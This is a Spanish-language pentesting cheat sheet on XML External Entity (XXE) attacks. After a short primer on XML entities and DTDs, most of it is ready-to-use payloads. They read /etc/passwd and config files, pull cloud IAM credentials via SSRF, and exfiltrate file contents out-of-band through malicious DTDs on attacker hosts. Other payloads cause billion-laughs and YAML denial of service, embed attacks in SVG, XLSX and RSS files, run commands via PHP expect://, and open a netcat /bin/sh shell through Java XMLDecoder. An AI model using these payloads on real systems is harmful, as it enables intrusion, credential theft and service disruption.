# XXE (XML External Entity)

## XML Basics

### ¿Qué es XML?

XML significa "lenguaje de marcado extensible". XML es un lenguaje diseñado para almacenar y transportar datos. Al igual que HTML, XML utiliza una estructura en forma de árbol de etiquetas y datos. A diferencia de HTML, XML no utiliza etiquetas predefinidas, por lo que a las etiquetas se les pueden dar nombres que describan los datos. Anteriormente en la historia de la web, XML estaba de moda como formato de transporte de datos (la "X" en "AJAX" significa "XML"). Pero su popularidad ahora ha disminuido a favor del formato JSON.


### ¿Qué son las entidades XML?

Las entidades XML son una forma de representar un elemento de datos dentro de un documento XML, en lugar de utilizar los datos en sí. Varias entidades están integradas en la especificación del lenguaje XML. 
Por ejemplo, las entidades `&lt;` y `&gt;` representan los caracteres `<` y `>`. Estos son metacaracteres que se usan para denotar etiquetas XML y, por lo tanto, generalmente deben representarse usando sus entidades cuando aparecen dentro de los datos.

### ¿Qué son los elementos XML?

Las declaraciones de tipo de elemento establecen las reglas para el tipo y la cantidad de elementos que pueden aparecer en un documento XML, qué elementos pueden aparecer unos dentro de otros y en qué orden deben aparecer. Por ejemplo:

- `<!ELEMENT stockCheck ANY>` significa que cualquier objeto podría estar dentro del padre `<stockCheck></stockCheck>`

- `<!ELEMENT stockCheck EMPTY>` significa que debería estar vacío `<stockCheck></stockCheck>`

- `<!ELEMENT stockCheck (productId,storeId)>` define que `<stockCheck>` puede tener hijos `<productId>` y `<storeId>`

### ¿Qué es la definición de tipo de documento? (DTD)

La definición de tipo de documento XML (DTD) contiene declaraciones que pueden definir la estructura de un documento XML, los tipos de valores de datos que puede contener y otros elementos. La DTD se declara dentro del elemento opcional `DOCTYPE` al comienzo del documento XML. 

El DTD puede ser completamente autónomo dentro del propio documento (conocido como "DTD interno") o puede cargarse desde otro lugar (conocido como "DTD externo") o puede ser un híbrido de los dos.

### ¿Qué son las entidades personalizadas XML?

XML permite definir entidades personalizadas dentro de la DTD. 

Por ejemplo:

`<!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>`

Esta definición significa que cualquier uso de la referencia de entidad `&myentity;` dentro del documento XML se reemplazará con el valor definido en `"my entity value"`.

### ¿Qué son las entidades externas XML?

Las entidades externas XML son un tipo de entidad personalizada cuya definición se encuentra fuera de la DTD donde se declaran.

La declaración de una entidad externa usa la palabra clave `SYSTEM` y debe especificar una URL desde la cual se debe cargar el valor de la entidad. 

Por ejemplo:

`<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>`

La URL puede usar el protocolo `file://`, por lo que las entidades externas se pueden cargar desde algún  archivo. 

Por ejemplo:

`<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>`

### ¿Qué son las entidades de parámetros XML?

A veces, los ataques XXE que utilizan entidades regulares se bloquean debido a alguna validación de entrada por parte de la aplicación o algún endurecimiento del analizador XML que se está utilizando. En esta situación, es posible que pueda utilizar entidades de parámetros XML en su lugar. 

Las entidades de parámetros XML son un tipo especial de entidad XML a la que solo se puede hacer referencia en otro lugar dentro de la DTD. Necesita saber dos cosas:

Primero, la declaración de una entidad de parámetro XML incluye el carácter de porcentaje antes del nombre de la entidad:

`<!ENTITY % myparameterentity "my parameter entity value" >`

Segundo, se hace referencia a las entidades de parámetros mediante el carácter de porcentaje `%` en lugar del signo `&` habitual:

`%myparameterentity;`

Esto significa que puede probar algún XXE blind utilizando la detección OOB a través de entidades de parámetros XML de la siguiente manera:

`<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>`

Esta carga útil XXE declara una entidad de parámetro XML llamada `xxe` y luego usa la entidad dentro de la DTD. Esto provocará una búsqueda de DNS y una solicitud HTTP al dominio del atacante, verificando que el ataque fue exitoso.

## Principales Ataques

1. Convierta el tipo de contenido de `application/json` `application/x-www-form-urlencoded` a `applcation/xml`.
2. La carga de archivos permite `docx`/`xlcs`/`pdf`/`zip`, descomprima el ZIP y agregue su código xml maligno en los archivos xml.
3. Si se permite `.svg` en la carga de imágenes, puede inyectar xml en svgs.
4. Si la aplicación web ofrece feeds RSS, agregue su código malicioso al RSS.
5. Fuzzee en `/soap` API, algunas aplicaciones aún ejecutan soap api.
6. Si la aplicación web de destino permite la integración SSO, puede inyectar su código xml milicious en la request/response SAML.


### New Entity "cgonzalo"

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY cgonzalo "3"> ]>
<stockCheck>
    <productId>&cgonzalo;</productId>
    <storeId>1</storeId>
</stockCheck>
```

<img src="https://user-images.githubusercontent.com/43796175/117304430-59f1e900-ae43-11eb-9189-e92ba5880314.jpg">


### Read File

Leer el fichero `/etc/passwd`. 

`<!DOCTYPE foo [<!ENTITY cgonzalo SYSTEM "/etc/passwd"> ]>`

`<!DOCTYPE foo [<!ENTITY cgonzalo SYSTEM "file:///etc/passwd"> ]>`

Si el servidor utiliza PHP:

`<!DOCTYPE foo [<!ENTITY cgonzalo SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>`

Para Windows, puede intentar leer: `C:\windows\system32\drivers\etc\hosts`

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY cgonzalo SYSTEM "/etc/passwd"> ]>
<data>&cgonzalo;</data>
```

<img src="https://user-images.githubusercontent.com/43796175/117306411-49427280-ae45-11eb-8d09-ffd696161ed6.jpg">

Además, intente declarando un elemento que sea la etiqueta de envoltura total del XML, es decir, `envoltura` como **ANY**. Para este caso el elemento es `stockCheck`:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ELEMENT stockCheck ANY>
<!ENTITY cgonzalo SYSTEM "file:///etc/passwd">
]>
<stockCheck>
    <productId>&cgonzalo;</productId>
    <storeId>1</storeId>
</stockCheck3>
```

<img src="https://user-images.githubusercontent.com/43796175/117307372-22d10700-ae46-11eb-93bb-33b2d77c3801.jpg">

Más ejemplos:

```
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
 </userInfo>
```

```
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
```


```
<?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
```
  
  
```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
```
 
Puede ser útil establecer `Content-Type: application/xml` en la solicitud al enviar la carga útil XML al servidor.


### XXE to SSRF

Un XXE también podría usarse para abusar de una SSRF dentro del Cloud:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

### XXE to Blind SSRF

Usando la técnica comentada anteriormente, puede hacer que el servidor acceda a un servidor que usted controla para mostrar que es vulnerable. Pero, si eso no funciona, tal vez se deba a que las entidades XML no están permitidas, por lo que podría intentar usar entidades de parámetros XML:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net"> %xxe; ]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```

### XXE to "Blind" SSRF (Exfiltrate data Out-of-Band)

Se indica al servidor que cargue un nuevo DTD con un payload que enviará el contenido de un archivo a través de una solicitud HTTP (para archivos de varias líneas, puede intentar exfiltrarlo a través de `ftp://`).

Un ejemplo de una DTD maliciosa alojada en el servidor atacante para filtrar el contenido del archivo `/etc/hostname` es el siguiente:

`http://web-attacker.com/malicious.dtd`:

```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```

Finalmente, el atacante debe enviar la siguiente carga útil XXE a la aplicación vulnerable:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>

<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```

### Error Based (External DTD)

En este caso vamos a hacer que el servidor cargue una DTD maliciosa que mostrará el contenido de un archivo dentro de un mensaje de error (esto solo es válido si puedes ver mensajes de error).

Puede activar un mensaje de error de análisis XML que contenga el contenido del archivo `/etc/passwd` utilizando un DTD externo malicioso de la siguiente manera:

`http://web-attacker.com/malicious.dtd`:

```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

Desde la request víctima:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>

<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```

Y debería ver el contenido del archivo dentro del mensaje de error de la respuesta del servidor web.

### Error Based (local DTD)

¿Qué pasa con las vulnerabilidades ciegas XXE cuando se bloquean las interacciones fuera de banda? (las conexiones externas no están disponibles)

En esta situación, aún podría ser posible desencadenar mensajes de error que contengan datos confidenciales, debido a una laguna en la especificación del lenguaje XML. Si la DTD de un documento utiliza un híbrido de declaraciones DTD internas y externas , entonces la DTD interna puede redefinir las entidades que se declaran en la DTD externa. Cuando esto sucede, la restricción sobre el uso de una entidad de parámetro XML dentro de la definición de otra entidad de parámetro se evade.

Esto significa que un atacante puede emplear la técnica XXE basada en errores desde dentro de una DTD interna, siempre que la entidad de parámetro XML que usa esté redefiniendo una entidad declarada dentro de una DTD externa. Por supuesto, si se bloquean las conexiones fuera de banda, el DTD externo no se puede cargar desde una ubicación remota. En su lugar, debe ser un archivo DTD externo que sea local para el servidor de aplicaciones. Esencialmente, el ataque implica invocar un archivo DTD que existe en el sistema de archivos local y reutilizarlo para redefinir una entidad existente de una manera que desencadene un error de análisis que contenga datos confidenciales.

Por ejemplo, suponga que hay un archivo DTD en el sistema de archivos del servidor en la ubicación `/usr/local/app/schema.dtd`, y este archivo DTD define una entidad llamada `custom_entity`. Un atacante puede activar un mensaje de error de análisis XML que contenga el contenido del archivo `/etc/passwd` enviando una DTD híbrida como la siguiente:

```
<!DOCTYPE foo [
    <!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
    <!ENTITY % custom_entity '
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
    '>
    %local_dtd;
]>
```

Como esta técnica utiliza un **DTD** interno, primero debe encontrar uno válido. Puede hacer esto instalando el mismo **OS/software** que está usando el servidor y buscando algunas DTD predeterminadas, o tomando una lista de **DTD** predeterminadas dentro de los sistemas y verificar si alguna de ellas existe:

```xxe
# entorno de escritorio GNOME

<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```

### DoS

Billion Laugh Attack

```
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```

### Yaml Attack

```
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```

## Hidden XXE Surfaces

### XInclude

Algunas aplicaciones reciben datos enviados por el cliente, los incrustan en el lado del servidor en un documento XML y luego analizan el documento. 

Un ejemplo de esto ocurre cuando los datos enviados por el cliente se colocan en una solicitud SOAP de backend, que luego es procesada por el servicio SOAP de backend.

En esta situación, no puede realizar un ataque clásico XXE, porque no controla todo el documento XML y, por lo tanto, no puede definir o modificar un elemento `DOCTYPE`. Sin embargo, es posible que pueda usar XInclude en su lugar. 

**XInclude** es una parte de la especificación XML que permite crear un documento XML a partir de subdocumentos. Puede generar un ataque **XInclude** dentro de cualquier valor de datos en un documento XML, por lo que el ataque se puede realizar en situaciones en las que solo controla un único elemento de datos que se coloca en un documento XML del lado del servidor.

Para realizar un ataque **XInclude**, debe hacer referencia al espacio de nombres **XInclude** y proporcionar la ruta al archivo que desea incluir. Por ejemplo:

```html
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```


### SVG File Upload

Algunas aplicaciones permiten a los usuarios cargar archivos que luego se procesan en el servidor. Algunos formatos de archivo comunes usan XML o contienen subcomponentes XML. 

Ejemplos de formatos basados en XML son formatos de documentos de oficina como `DOCX` y formatos de imagen como `SVG`.

Por ejemplo, una aplicación puede permitir a los usuarios cargar imágenes y procesarlas o validarlas en el servidor después de cargarlas. Incluso si la aplicación espera recibir un formato como `PNG` o `JPEG`, la biblioteca de procesamiento de imágenes que se está utilizando puede admitir imágenes `SVG`. 

Dado que el formato `SVG` usa `XML`, un atacante puede enviar una imagen `SVG` maliciosa y así alcanzar una superficie de ataque oculta para las vulnerabilidades XXE.

```
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

También puede intentar ejecutar comandos, usando el wrapper PHP "expect":

```
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
    <image xlink:href="expect://ls"></image>
</svg>
```

Tenga en cuenta que la primera línea del archivo leído o del resultado de la ejecución aparecerá **DENTRO** de la imagen creada. Por lo tanto, debe poder acceder a la imagen que SVG ha creado.


### XXE OOB via SVG Rasterization

`xxe.svg`:

```
<!DOCTYPE svg [
<!ELEMENT svg ANY >
<!ENTITY % sp SYSTEM "http://example.org:8080/xxe.xml">
%sp;
%param1;
]>
<svg viewBox="0 0 200 200" version="1.2" xmlns="http://www.w3.org/2000/svg" style="fill:red">
      <text x="15" y="100" style="fill:black">XXE via SVG rasterization</text>
      <rect x="0" y="0" rx="10" ry="10" width="200" height="200" style="fill:pink;opacity:0.7"/>
      <flowRoot font-size="15">
         <flowRegion>
           <rect x="0" y="0" width="200" height="200" style="fill:red;opacity:0.3"/>
         </flowRegion>
         <flowDiv>
            <flowPara>&exfil;</flowPara>
         </flowDiv>
      </flowRoot>
</svg>
```

`xxe.xml`:

```
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/hostname">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'ftp://example.org:2121/%data;'>">
```



### PDF File Upload

Lea el siguiente documento para explotar PDF a través de File Upload:

[XXE a través de PDF](https://github.com/0xCGonzalo/Golden-Guide-for-Pentesting/blob/master/Web%20Application/XXE/XXE%20in%20PDF/xxe_in_pdf.md)

### Content-Type: de *x-www-urlencoded* a *XML*

Si una solicitud POST acepta los datos en formato XML, puede intentar explotar un XXE en esa solicitud. 

Por ejemplo, si una solicitud normal contiene lo siguiente:

```
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```

Entonces es posible que pueda enviar la siguiente solicitud, con el mismo resultado:

```
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```

### Content-Type: de *JSON* a *XXE*

Para cambiar la solicitud, puede utilizar una extensión Burp llamada `Content Type Converter` 

Content-Type: application/json;charset=UTF-8

```
{"root": {"root": {
  "firstName": "Avinash",
  "lastName": "",
  "country": "United States",
  "city": "ddd",
  "postalCode": "ddd"
}}}
```

```
Content-Type: application/xml;charset=UTF-8

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://34.229.92.127:8000/TEST.ext" >]> 
<root>
 <root>
  <firstName>&xxe;</firstName>
  <lastName/>
  <country>United States</country>
  <city>ddd</city>
  <postalCode>ddd</postalCode>
 </root>
</root>
```

### Base64

Esto solo funciona si el server XML acepta el protocolo `data://`.

```
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```

### UTF-7

You can use the Encode Recipe of [cyberchef](https://gchq.github.io/CyberChef/#recipe=Encode_text('UTF-7%20(65000)')&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4tpA)

```
<!xml version="1.0" encoding="UTF-7"?-->
+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-
```

```
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```

## PHP Wrappers

### Base64

#### Extract index.php

```
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
```

#### Extract external resource

```
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3"> ]>
```

### Remote Code Execution

#### If PHP "expect" module is loaded

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
</creds>
```

## SOAP XXE

```
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
```

## RSS to XXE

Valid XML with RSS format to exploit an XXE vulnerability.

### Ping Back

Simple HTTP request to attackers server

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "http://<AttackIP>/rssXXE" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>XXE Test Blog</title>
<link>http://example.com/</link>
<description>XXE Test Blog</description>
<lastBuildDate>Mon, 02 Feb 2015 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>Test Post</description>
<author>author@example.com</author>
<pubDate>Mon, 02 Feb 2015 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```

### Read File

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```

### Read Source Code

Using PHP base64 filter

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```

## Java XMLDecoder XXE to RCE

`XMLDecoder` es una clase Java que crea objetos basados en un mensaje XML. 

Si un usuario malintencionado puede conseguir que una aplicación utilice datos arbitrarios en una llamada al método `readObject`, obtendrá instantáneamente la ejecución del código en el servidor.

### Using Runtime().exec()

```
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
 <object class="java.lang.Runtime" method="getRuntime">
      <void method="exec">
      <array class="java.lang.String" length="6">
          <void index="0">
              <string>/usr/bin/nc</string>
          </void>
          <void index="1">
              <string>-l</string>
          </void>
          <void index="2">
              <string>-p</string>
          </void>
          <void index="3">
              <string>9999</string>
          </void>
          <void index="4">
              <string>-e</string>
          </void>
          <void index="5">
              <string>/bin/sh</string>
          </void>
      </array>
      </void>
 </object>
</java>
```

### ProcessBuilder

```
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
  <void class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="6">
      <void index="0">
        <string>/usr/bin/nc</string>
      </void>
      <void index="1">
         <string>-l</string>
      </void>
      <void index="2">
         <string>-p</string>
      </void>
      <void index="3">
         <string>9999</string>
      </void>
      <void index="4">
         <string>-e</string>
      </void>
      <void index="5">
         <string>/bin/sh</string>
      </void>
    </array>
    <void method="start" id="process">
    </void>
  </void>
</java>
```

## Windows Local DTD and Side Channel Leak to disclose HTTP response/file contents


### Disclose local file

```
<!DOCTYPE doc [
    <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">
    <!ENTITY % SuperClass '>
        <!ENTITY &#x25; file SYSTEM "file://D:\webserv2\services\web.config">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://t/#&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
      <!ENTITY test "test"'
    >
    %local_dtd;
  ]><xxx>cacat</xxx>
```
  
  
### Disclose HTTP Response

```
<!DOCTYPE doc [
    <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">
    <!ENTITY % SuperClass '>
        <!ENTITY &#x25; file SYSTEM "https://erp.company.com">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://test/#&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
      <!ENTITY test "test"'
    >
    %local_dtd;
  ]><xxx>cacat</xxx>
```

## XXE inside XLSX file

Extract the excel file.

```bash
$ mkdir XXE && cd XXE
$ unzip ../XXE.xlsx
Archive:  ../XXE.xlsx
  inflating: xl/drawings/drawing1.xml
  inflating: xl/worksheets/sheet1.xml
  inflating: xl/worksheets/_rels/sheet1.xml.rels
  inflating: xl/sharedStrings.xml
  inflating: xl/styles.xml
  inflating: xl/workbook.xml
  inflating: xl/_rels/workbook.xml.rels
  inflating: _rels/.rels
  inflating: [Content_Types].xml
```

Add your blind XXE payload inside `xl/workbook.xml`.

```
<xml...>
<!DOCTYPE x [ <!ENTITY xxe SYSTEM "http://YOURCOLLABORATORID.burpcollaborator.net/"> ]>
<x>&xxe;</x>
<workbook...>
```

Alternativly, add your payload in `xl/sharedStrings.xml`:

```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [ <!ELEMENT t ANY > <!ENTITY xxe SYSTEM "http://YOURCOLLABORATORID.burpcollaborator.net/"> ]>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="10" uniqueCount="10"><si><t>&xxe;</t></si><si><t>testA2</t></si><si><t>testA3</t></si><si><t>testA4</t></si><si><t>testA5</t></si><si><t>testB1</t></si><si><t>testB2</t></si><si><t>testB3</t></si><si><t>testB4</t></si><si><t>testB5</t></si></sst>
```

Rebuild the Excel file:

```
$ zip -r ../poc.xlsx *
updating: [Content_Types].xml (deflated 71%)
updating: _rels/ (stored 0%)
updating: _rels/.rels (deflated 60%)
updating: docProps/ (stored 0%)
updating: docProps/app.xml (deflated 51%)
updating: docProps/core.xml (deflated 50%)
updating: xl/ (stored 0%)
updating: xl/workbook.xml (deflated 56%)
updating: xl/worksheets/ (stored 0%)
updating: xl/worksheets/sheet1.xml (deflated 53%)
updating: xl/styles.xml (deflated 60%)
updating: xl/theme/ (stored 0%)
updating: xl/theme/theme1.xml (deflated 80%)
updating: xl/_rels/ (stored 0%)
updating: xl/_rels/workbook.xml.rels (deflated 66%)
updating: xl/sharedStrings.xml (deflated 17%)
```
